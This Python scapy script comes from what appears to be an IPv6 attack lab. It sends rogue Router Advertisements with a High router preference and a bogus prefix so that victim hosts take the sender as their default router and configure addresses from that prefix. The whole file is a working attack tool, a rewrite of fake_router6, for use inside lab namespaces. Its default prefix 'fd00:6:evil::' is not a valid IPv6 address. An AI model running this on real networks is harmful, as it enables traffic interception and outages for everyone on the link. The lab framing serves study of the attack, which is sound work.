#!/usr/bin/env python3
"""01-rogue-ra.py -- send a rogue Router Advertisement into the attack lab.

Advertises a bogus prefix with a High router preference (RFC 4191), so
the victim (accept_ra is on by default after lab-setup.sh) installs a
default route and/or a SLAAC address from a prefix nobody legitimate
actually owns. See deep-dive.md's Attack Lab section - this is the
from-scratch version of thc-ipv6's fake_router6.

Usage (run inside the attacker namespace):
    sudo ip netns exec v6lab-attacker python3 01-rogue-ra.py --iface veth-attacker
    sudo ip netns exec v6lab-attacker python3 01-rogue-ra.py --iface veth-attacker --prefix fd00:6:evil::
"""

import argparse
from scapy.all import Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, get_if_hwaddr, sendp


def eui64_link_local(mac_str):
    b = [int(x, 16) for x in mac_str.split(":")]
    b[0] ^= 0x02
    iid = b[0:3] + [0xff, 0xfe] + b[3:6]
    return "fe80::" + ":".join(f"{iid[i]:02x}{iid[i + 1]:02x}" for i in range(0, 8, 2))


parser = argparse.ArgumentParser(description="Send a rogue Router Advertisement (RFC 4861)")
parser.add_argument("--iface", required=True, help="interface to send on")
parser.add_argument("--prefix", default="fd00:6:evil::", help="bogus prefix to advertise")
parser.add_argument("--prefix-len", type=int, default=64)
parser.add_argument("--lifetime", type=int, default=1800, help="router lifetime in seconds")
parser.add_argument("--count", type=int, default=1, help="how many RAs to send")
args = parser.parse_args()

src_mac = get_if_hwaddr(args.iface)
src_ip = eui64_link_local(src_mac)

pkt = (
    Ether(src=src_mac, dst="33:33:00:00:00:01")
    / IPv6(src=src_ip, dst="ff02::1")
    / ICMPv6ND_RA(chlim=64, routerlifetime=args.lifetime, prf=1)  # prf=1: High (RFC 4191)
    / ICMPv6NDOptPrefixInfo(prefix=args.prefix, prefixlen=args.prefix_len, L=1, A=1,
                            validlifetime=2592000, preferredlifetime=604800)
    / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
)

print(f"sending {args.count} rogue RA(s) on {args.iface} from {src_ip}")
print(f"  prefix: {args.prefix}/{args.prefix_len}  preference=High  router lifetime={args.lifetime}s")
sendp(pkt, iface=args.iface, count=args.count, inter=1, verbose=False)
print("done. on the victim: ip -6 addr show ; ip -6 route show")
